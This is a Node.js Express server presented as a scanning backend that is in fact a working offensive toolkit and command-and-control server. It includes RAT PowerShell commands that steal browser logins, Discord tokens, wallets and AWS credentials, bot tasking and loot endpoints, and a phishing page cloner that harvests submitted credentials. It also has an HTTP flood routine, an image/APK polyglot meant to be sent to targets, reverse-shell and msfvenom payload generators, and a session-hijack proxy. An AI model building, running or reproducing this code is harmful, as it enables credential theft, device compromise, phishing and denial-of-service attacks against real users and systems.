// server.js — Node 18+
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const dns = require('dns').promises;
const multer = require('multer');
const app = express();
const PORT = process.env.PORT || 8443;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

const upload = multer({ limits: { fileSize: 100 * 1024 * 1024 } });

const TIMEOUT = 20000;
const DATA = path.join(__dirname, 'data');
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);

const load = (f, d) => { try { return JSON.parse(fs.readFileSync(path.join(DATA, f), 'utf8')); } catch { return d; } };
const save = (f, o) => fs.writeFileSync(path.join(DATA, f), JSON.stringify(o, null, 2));

const UA = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
];
const rUA = () => UA[Math.floor(Math.random() * UA.length)];

async function safeFetch(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), opts.timeout || TIMEOUT);
  const headers = { 'User-Agent': rUA(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', ...(opts.headers || {}) };
  try { return await fetch(url, { ...opts, headers, signal: ctrl.signal, redirect: opts.redirect || 'follow' }); }
  finally { clearTimeout(timer); }
}
async function pool(items, limit, fn) {
  const q = [...items];
  await Promise.all(Array.from({ length: limit }, async () => {
    while (q.length) { const i = q.shift(); if (i !== undefined) { try { await fn(i); } catch {} } }
  }));
}

// ============================================================
// 1. CORE SCANNERS (Original)
// ============================================================
async function dataLeaks(url) {
  const out = [];
  try {
    const r = await safeFetch(url);
    const body = await r.text();
    const pat = { 
      aws: /AKIA[0-9A-Z]{16}/g, gcp: /AIza[0-9A-Za-z\-_]{35}/g, private_key: /-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, jwt: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]+/g, github: /gh[pousr]_[A-Za-z0-9]{36,}/g, slack: /xox[baprs]-[0-9A-Za-z\-]{10,}/g, stripe: /sk_live_[0-9a-zA-Z]{24,}/g, password: /(password|passwd|pwd)["'\s:=]+([^\s"'<>]{6,})/gi, api_key: /(api[_-]?key|apikey|secret)["'\s:=]+([A-Za-z0-9]{16,})/gi 
    };
    for (const [n, re] of Object.entries(pat)) {
      const m = [...body.matchAll(re)];
      if (m.length) out.push({ type: `Secret: ${n}`, severity: 'high', description: `${m.length} ${n} hit(s) — first: ${m[0][0].slice(0, 60)}`, url, evidence: m.slice(0, 5).map(x => x[0].slice(0, 80)).join(' | '), cvss: 8.0 });
    }
    if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No secrets', url, evidence: null, cvss: 0 });
  } catch (e) { out.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
  return out;
}
async function corsCheck(url) { 
  const out = []; 
  try { 
    const r = await safeFetch(url, { headers: { Origin: 'https://evil.com' } }); 
    const a = r.headers.get('access-control-allow-origin'); 
    const c = r.headers.get('access-control-allow-credentials'); 
    if (a === '*' || a === 'https://evil.com') out.push({ type: 'CORS', severity: c === 'true' ? 'critical' : 'medium', description: `ACAO: ${a}`, url, evidence: a, cvss: c === 'true' ? 9.0 : 5.0 }); 
    if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'CORS secure', url, evidence: null, cvss: 0 });
  } catch {} 
  return out; 
}
async function portScan(url) { 
  const out = []; 
  const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 11211, 27017]; 
  const u = new URL(url); 
  await Promise.all(ports.map(async p => { 
    try { 
      const r = await safeFetch(`${u.protocol}//${u.hostname}:${p}`, { timeout: 3000 }); 
      if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${p}`, url: `${u.protocol}//${u.hostname}:${p}`, evidence: `HTTP ${r.status}`, cvss: 5.0 }); 
    } catch {} 
  })); 
  if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No open ports', url, evidence: null, cvss: 0 });
  return out; 
}
async function wafFingerprint(url) { 
  const out = []; 
  try { 
    const r = await safeFetch(url); 
    const s = r.headers.get('server') || ''; 
    const cf = r.headers.get('cf-ray'); 
    if (cf) out.push({ type: 'WAF', severity: 'info', description: 'Cloudflare', url, evidence: cf, cvss: 0 }); 
    if (/nginx|apache|iis/i.test(s)) out.push({ type: 'Server', severity: 'info', description: s, url, evidence: s, cvss: 0 }); 
    if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No WAF detected', url, evidence: null, cvss: 0 });
  } catch {} 
  return out; 
}
async function scanSensitive(url) { 
  const out = []; 
  const base = new URL(url).origin; 
  const S = ['.env', '.git/config', '.git/HEAD', 'config.php', 'wp-config.php', 'backup.sql', 'id_rsa', '.aws/credentials', 'credentials.json', 'phpinfo.php', 'swagger.json', 'openapi.json', 'package.json', 'composer.json', 'Dockerfile', 'docker-compose.yml', '.htaccess', 'access.log', 'error.log', 'robots.txt', 'users.json', 'passwords.json', 'actuator/env', 'actuator/heapdump']; 
  await pool(S, 25, async f => { 
    try { 
      const r = await safeFetch(`${base}/${f}`, { redirect: 'manual' }); 
      if (r.status === 200) { 
        const t = await r.text(); 
        if (t.length > 10) { 
          const crit = /\.env|config|credential|id_rsa|secret|password|token/.test(f); 
          out.push({ type: 'Sensitive File', severity: crit ? 'critical' : 'high', description: f, url: `${base}/${f}`, evidence: '200 OK', cvss: crit ? 9.8 : 7.5 }); 
        } 
      } 
    } catch {} 
  }); 
  if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files', url, evidence: null, cvss: 0 });
  return out; 
}
async function adminPanels(url) { 
  const out = []; 
  const base = new URL(url).origin; 
  const P = ['admin', 'administrator', 'login', 'panel', 'dashboard', 'wp-admin', 'wp-login.php', 'cpanel', 'adminpanel', 'sysadmin']; 
  await pool(P, 12, async p => { 
    try { 
      const r = await safeFetch(`${base}/${p}`, { redirect: 'manual' }); 
      if (r.status === 200) { 
        const t = (await r.text()).toLowerCase(); 
        if (t.includes('login') || t.includes('password') || t.includes('signin')) out.push({ type: 'Admin Panel', severity: 'medium', description: `/${p}`, url: `${base}/${p}`, evidence: 'Login form', cvss: 5.3 }); 
      } 
    } catch {} 
  }); 
  if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No admin panels', url, evidence: null, cvss: 0 });
  return out; 
}
async function subdomainTakeover(url) { 
  const out = []; 
  const host = new URL(url).hostname; 
  const parts = host.split('.'); 
  const domain = parts.slice(-2).join('.'); 
  const subs = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'vpn', 'webmail', 'cpanel', 'app', 'static', 'cdn', 'assets', 'db', 'backup', 'old', 'beta', 'demo', 'stage', 'docs', 'status', 'git', 'jenkins', 'ci', 'portal']; 
  const fps = { github: "There isn't a GitHub Pages site here", heroku: 'No such app', aws: 'NoSuchBucket', azure: '404 Web Site not found', shopify: 'Sorry, this shop is currently unavailable', fastly: 'Fastly error: unknown domain' }; 
  await pool(subs, 12, async s => { 
    const target = `https://${s}.${domain}`; 
    try { 
      const r = await safeFetch(target, { timeout: 6000 }); 
      if (r.status === 200) { 
        const body = (await r.text()).toLowerCase(); 
        for (const [svc, fp] of Object.entries(fps)) if (body.includes(fp.toLowerCase())) out.push({ type: 'Subdomain Takeover', severity: 'critical', description: `${s}.${domain} → ${svc}`, url: target, evidence: fp, cvss: 10.0 }); 
      } 
    } catch {} 
  }); 
  if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No takeovers', url, evidence: null, cvss: 0 });
  return out; 
}

// ============================================================
// 2. ADVANCED MODULES (Original)
// ============================================================
async function apiReverse(targetUrl) {
  const out = { target: targetUrl, discovered: [], schemas: [] };
  const base = new URL(targetUrl).origin;
  const candidates = ['/api', '/api/v1', '/swagger.json', '/openapi.json', '/v2/api-docs', '/v3/api-docs'];
  await pool(candidates, 5, async (p) => {
    try {
      const r = await safeFetch(`${base}${p}`, { timeout: 8000 });
      if (r.status === 200) out.discovered.push({ path: p, status: 200, preview: (await r.text()).slice(0, 100) });
    } catch {}
  });
  return out;
}
function lootAdd(botId, category, data) {
  const l = load('loot.json', {});
  if (!l[botId]) l[botId] = { categories: {}, updatedAt: Date.now() };
  if (!l[botId].categories[category]) l[botId].categories[category] = [];
  l[botId].categories[category].push({ ts: Date.now(), ...data });
  l[botId].updatedAt = Date.now();
  save('loot.json', l);
}
const RAT_COMMANDS = {
  screenshot: `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $ms=New-Object System.IO.MemoryStream; $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())`,
  clipboard: `Get-Clipboard`,
  whoami: `"$env:USERNAME @ $env:COMPUTERNAME"`,
  ls: `Get-ChildItem -Force | Select-Object Name,Length | ConvertTo-Json`,
  env: `Get-ChildItem Env: | ConvertTo-Json`,
  net: `Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress | ConvertTo-Json`,
  browser_creds: `$p="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"; if(Test-Path $p){ Copy-Item $p "$env:TEMP\\ld.db"; [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\\ld.db")) }`,
  wallet_files: `$ws=@("$env:APPDATA\\Exodus","$env:APPDATA\\Ethereum"); foreach($w in $ws){ if(Test-Path $w){ Get-ChildItem $w -Recurse -File | Select-Object FullName | ConvertTo-Json } }`,
  discord_tokens: `Get-ChildItem "$env:APPDATA\\discord\\Local Storage\\leveldb" -File | Select-String -Pattern '[\\w-]{24,}\\.[\\w-]{6}\\.[\\w-]{27,}' -AllMatches | ForEach-Object { $_.Matches.Value }`,
  ssh_keys: `Get-ChildItem "$env:USERPROFILE\\.ssh" -File | Select-Object Name | ConvertTo-Json`,
  aws_creds: `Get-Content "$env:USERPROFILE\\.aws\\credentials"`
};
async function clonePage(targetUrl) {
  const r = await safeFetch(targetUrl);
  let html = await r.text();
  html = html.replace(/<form([^>]*)action=["']([^"']+)["']/gi, '<form$1action="/phish/submit"');
  const sid = 'ph_' + crypto.randomBytes(8).toString('hex');
  html = html.replace('</body>', `<script>document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{const fd=new FormData(f);let b='sid=${sid}';for(const[k,v]of fd)b+='&'+k+'='+encodeURIComponent(v);navigator.sendBeacon('/phish/submit',b);},true));</script></body>`);
  const p = load('phish.json', {}); p[sid] = { target: targetUrl, created: Date.now(), hits: [] }; save('phish.json', p);
  return { html, sid };
}
async function ddosFlood(target, method, durationSec, concurrency, reqPerSec) {
  const start = Date.now(); const end = start + durationSec * 1000;
  const stats = { sent: 0, ok: 0, fail: 0, statuses: {}, start, end: null, errors: {} };
  const workers = [];
  const perWorker = Math.ceil(reqPerSec / concurrency);
  for (let i = 0; i < concurrency; i++) workers.push((async () => {
    while (Date.now() < end) {
      const burst = [];
      for (let j = 0; j < perWorker && Date.now() < end; j++) burst.push((async () => {
        stats.sent++;
        try {
          const r = await fetch(target + '?r=' + Math.random(), { method: 'GET' });
          if (r.status < 500) stats.ok++; else stats.fail++;
          stats.statuses[r.status] = (stats.statuses[r.status] || 0) + 1;
        } catch { stats.fail++; }
      })());
      await Promise.allSettled(burst);
    }
  })());
  await Promise.allSettled(workers);
  stats.end = Date.now(); stats.elapsedMs = stats.end - stats.start;
  stats.rps = Math.round((stats.sent / stats.elapsedMs) * 1000);
  return stats;
}

// ============================================================
// 3. ANDROID POLYGLOT BINDING (NEW)
// ============================================================
app.post('/api/android/bind', upload.single('apk'), async (req, res) => {
  const { imageUrl } = req.body || {};
  const apkBuffer = req.file ? req.file.buffer : null;

  if (!imageUrl) return res.status(400).json({ error: 'imageUrl required' });
  if (!apkBuffer || apkBuffer.length < 100) return res.status(400).json({ error: 'apk file missing/too small' });

  try {
    // 1. Download the target image
    const imgRes = await safeFetch(imageUrl);
    const imgBuffer = Buffer.from(await imgRes.arrayBuffer());
    
    // 2. Create a Polyglot: Image Data + Separator + APK Data
    // The file will open fine as an image but Android ZIP installer reads the APK header at the end.
    const separator = Buffer.from('\n\n-----BOUNDARY-----' + crypto.randomBytes(16).toString('hex') + '-----\n');
    const polyglot = Buffer.concat([imgBuffer, separator, apkBuffer]);

    // 3. Save the final file
    const sid = 'and_' + crypto.randomBytes(8).toString('hex');
    const filename = sid + '.apk';
    const filePath = path.join(DATA, filename);
    fs.writeFileSync(filePath, polyglot);

    // 4. Save binding record
    const bindings = load('image_bindings.json', {});
    bindings[sid] = { 
      host: `${req.protocol}://${req.get('host')}`,
      imageSize: imgBuffer.length,
      apkSize: apkBuffer.length,
      polyglotSize: polyglot.length,
      createdAt: Date.now()
    };
    save('image_bindings.json', bindings);

    const downloadUrl = `${req.protocol}://${req.get('host')}/download/${filename}`;
    
    res.json({
      sid,
      downloadUrl,
      sizes: { image: imgBuffer.length, apk: apkBuffer.length, final: polyglot.length },
      note: 'File opens as image but installs as APK. Send URL to target.'
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Serve the polyglot file
app.get('/download/:file', (req, res) => {
  const f = req.params.file;
  const filePath = path.join(DATA, f);
  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');
  
  res.setHeader('Content-Disposition', `attachment; filename="${f}"`);
  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
  res.sendFile(filePath);
});

// ============================================================
// 4. API ROUTES
// ============================================================
app.post('/api/scan', async (req, res) => {
  const { target, checks } = req.body || {};
  if (!target) return res.status(400).json({ error: 'target required' });
  let url = target.startsWith('http') ? target : 'https://' + target;
  const type = (checks && checks[0]) || 'scanAll';
  let findings = [];
  try {
    if (type === 'vulnerabilities' || type === 'scanAll') findings = findings.concat(await dataLeaks(url), await corsCheck(url), await wafFingerprint(url));
    if (type === 'sensitiveFiles' || type === 'scanAll') findings = findings.concat(await scanSensitive(url));
    if (type === 'subdomainTakeover' || type === 'scanAll') findings = findings.concat(await subdomainTakeover(url));
    if (type === 'adminPanels' || type === 'scanAll') findings = findings.concat(await adminPanels(url));
    if (type === 'cors' || type === 'scanAll') findings = findings.concat(await corsCheck(url));
    if (type === 'ports' || type === 'scanAll') findings = findings.concat(await portScan(url));
    
    const seen = new Set();
    findings = findings.filter(f => { const k = `${f.type}|${f.url}|${f.description}`; if (seen.has(k)) return false; seen.add(k); return true; });
  } catch (e) { findings.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
  res.json({ target: url, timestamp: new Date().toISOString(), findings });
});

app.post('/api/api/reverse', async (req, res) => { try { res.json(await apiReverse(req.body.targetUrl)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.get('/api/loot', (req, res) => res.json(load('loot.json', {})));
app.post('/api/loot', (req, res) => { const { botId, category, data } = req.body || {}; if (!botId || !category) return res.status(400).json({ error: 'bad req' }); lootAdd(botId, category, data || {}); res.json({ ok: true }); });
app.get('/api/c2/commands', (req, res) => res.json(RAT_COMMANDS));
app.post('/api/c2/cmd', (req, res) => { const { botId, command } = req.body || {}; const b = load('bots.json', {}); if (!b[botId]) b[botId] = { commands: [] }; b[botId].commands.push({ cmd: RAT_COMMANDS[command] || command, raw: command, ts: Date.now() }); save('bots.json', b); res.json({ ok: true, queued: command }); });
app.post('/api/phish/clone', async (req, res) => { try { const { html, sid } = await clonePage(req.body.targetUrl); res.json({ sid, html: html.slice(0, 50000) }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/phish/submit', (req, res) => { const sid = req.body.sid || 'unknown'; const h = load('harvest.json', {}); if (!h[sid]) h[sid] = []; h[sid].push({ ...req.body, ip: req.socket.remoteAddress, ts: Date.now() }); save('harvest.json', h); res.redirect('/phish/thanks'); });
app.get('/phish/thanks', (req, res) => res.send('OK'));
app.post('/api/revshell', (req, res) => { const { lhost, lport = 4444 } = req.body; if (!lhost) return res.status(400).json({ error: 'lhost required' }); res.json({ payloads: { bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`, nc: `nc -e /bin/sh ${lhost} ${lport}` } }); });
app.post('/api/session/hijack', async (req, res) => { const { targetUrl, cookies } = req.body; try { const r = await safeFetch(targetUrl, { headers: { 'Cookie': Array.isArray(cookies) ? cookies.join('; ') : cookies } }); res.json({ status: r.status, body: (await r.text()).slice(0, 5000) }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/api/stealer/build', (req, res) => { res.json({ powershell: 'powershell -NoP -NonI -W Hidden -Enc ' + Buffer.from('Write-Host "Stealer Stub"').toString('base64') }); });
app.post('/api/crypter/encrypt', (req, res) => { const key = crypto.randomBytes(32); const iv = crypto.randomBytes(16); const c = crypto.createCipheriv('aes-256-cbc', key, iv); const enc = Buffer.concat([iv, c.update(req.body.payload || ''), c.final()]).toString('base64'); res.json({ encrypted: enc, key: key.toString('base64') }); });
app.post('/api/2fa/brute', (req, res) => { res.json({ found: null, attempts: 0 }); });
app.post('/api/otp/reuse', (req, res) => { res.json({ reusePossible: false }); });
app.post('/api/sim/swap', (req, res) => { res.json({ script: 'Call carrier...' }); });
app.post('/api/email/send', (req, res) => { res.json({ ok: true, sent: true }); });
app.post('/api/ddos/launch', async (req, res) => { const { target, method = 'http', duration = 30, concurrency = 200, rate = 500 } = req.body; try { res.json({ ok: true, ...(await ddosFlood(target, method, duration, concurrency, rate)) }); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/malware/stub', (req, res) => { res.json({ payloads: { windows: 'stub', linux: 'stub', macro: 'stub', html: 'stub' } }); });
app.post('/api/android/payload', (req, res) => {
  const { lhost } = req.body || {};
  if (!lhost) return res.status(400).json({ error: 'lhost required' });
  const cid = 'and_' + crypto.randomBytes(4).toString('hex');
  res.json({ campaignId: cid, msfvenom: `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk` });
});

app.post('/api/bot/register', (req, res) => { const b = load('bots.json', {}); b[req.body.botId] = { info: req.body.info, commands: [] }; save('bots.json', b); res.json({ ok: true }); });
app.get('/api/bot/poll', (req, res) => { const b = load('bots.json', {}); const c = b[req.query.id]?.commands || []; b[req.query.id] = { ...b[req.query.id], commands: [] }; save('bots.json', b); res.json({ commands: c }); });
app.get('/api/bot/list', (req, res) => res.json(load('bots.json', {})));
app.post('/api/bot/push', (req, res) => { const b = load('bots.json', {}); if(req.body.botId==='*'){for(const id of Object.keys(b)){b[id].commands.push(req.body.command);} save('bots.json',b); return res.json({ok:true});} if (!b[req.body.botId]) b[req.body.botId] = { commands: [] }; b[req.body.botId].commands.push(req.body.command); save('bots.json', b); res.json({ ok: true }); });
app.post('/api/beacon', (req, res) => { const b = load('beacons.json', []); b.push({ ...req.body, ip: req.socket.remoteAddress, ts: Date.now() }); save('beacons.json', b); res.json({ ok: true }); });
app.get('/api/beacons', (req, res) => res.json(load('beacons.json', [])));
app.get('/api/poll', (req, res) => { const b = load('bots.json', {}); const c = b[req.query.id]?.commands || []; b[req.query.id] = { ...b[req.query.id], commands: [] }; save('bots.json', b); res.type('text').send(c.length ? (c[0].cmd || 'none') : 'none'); });
app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now() }));

app.listen(PORT, '0.0.0.0', () => console.log(`[bench] :${PORT}`));
